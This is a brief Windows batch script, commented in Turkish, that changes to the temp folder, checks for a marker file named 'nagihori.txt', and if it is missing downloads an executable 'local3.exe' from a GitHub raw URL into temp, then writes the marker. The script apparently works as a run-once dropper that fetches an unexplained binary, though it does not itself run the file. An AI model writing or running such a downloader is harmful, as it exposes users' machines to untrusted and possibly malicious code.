@echo off
cd %temp%

REM Dosya kontrolü
if exist nagihori.txt (
    echo nagihori.txt bulundu, çıkılıyor...
    exit /b
) else (
    echo nagihori.txt yok, devam ediliyor...
    curl https://github.com/Banglade-sh23/-/raw/refs/heads/main/local3.exe -o local3.exe
    
    echo "asd" > nagihori.txt 
    
)
